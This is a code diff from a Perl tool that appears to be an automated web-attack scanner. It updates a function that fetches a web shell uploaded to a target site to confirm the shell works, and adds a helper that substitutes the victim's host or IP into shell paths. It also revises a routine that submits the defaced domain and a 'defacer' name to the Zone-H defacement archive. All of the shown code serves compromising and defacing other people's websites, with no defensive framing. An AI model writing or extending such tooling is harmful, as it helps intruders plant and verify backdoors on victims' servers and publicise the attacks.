@@ -615,6 +615,7 @@ sub doRegex {
 ## CHECK UPLOADED SHELL
 sub checkUloadedShell {
   my $URL=$_[0];
+  $validShell=replaceReferencies($URL, $validShell);
   $URL=getHost($URL);
   $URL.=$validShell;
   my $reShell = $ua->get("$URL");
@@ -623,22 +624,42 @@ sub checkUloadedShell {
   }
 }
 
+## REPLACE REFERENCIES TARGET HOST HOSTIP
+sub replaceReferencies {
+  my ($URL, $ref)=@_;
+  if ($ref=~/\-HOSTIP/) {
+    my $ips=checkExtraInfo($URL);
+    if ($ips) {
+      my $ad=inet_ntoa($ips);
+      $ref=~s/\-\-HOSTIP/$ad/ig;
+    }
+    else{
+      print "$c[2] $TT[11]\n";
+    }
+  }elsif ($ref=~/\-HOST/) {
+    $URL=getHost($URL);   
+    $ref=~s/\-\-HOST/$URL/ig;
+  }elsif ($ref=~/\-TARGET/) {
+    $ref=~s/\-\-TARGET/$URL/ig;
+  }
+  return $ref;
+}
+
 ## ZONE-H
 sub zoneH {
-  my ($url, $uploader)=@_;
-  my @zoneD=split("=>", $uploader);
-  $url=getHost($url);
-  $url.=$zoneD[1] if $zoneD[1];
+  my ($URL, $zoneH)=@_;
+  my @zoneD=split("=>", $zoneH);
+  my $url=replaceReferencies($URL, $zoneD[1]);
   $url=~s/\s//ig;
   my $zoneHurl="http://www.zone-h.org/notify/single";
   my $ua = LWP::UserAgent->new;
   my $res = $ua->post($zoneHurl,
-                 Content => ['defacer' => $zoneD[0],
-				            'domain1' => $url,
-				            'hackmode' => '15',
-				            'reason' => '1',
-				            'Gönder' => 'Send',
-				            ]);
+                  Content => ['defacer' => $zoneD[0],
+				              'domain1' => $url,
+				              'hackmode' => '15',
+				              'reason' => '1',
+				              'Gönder' => 'Send',
+				              ]);
   if ($res->content =~ /color\=\"red\"\>(.*)<\/font\><\/li\>/) {
     my $znh=$1;
     if ($znh=~m/OK/) {
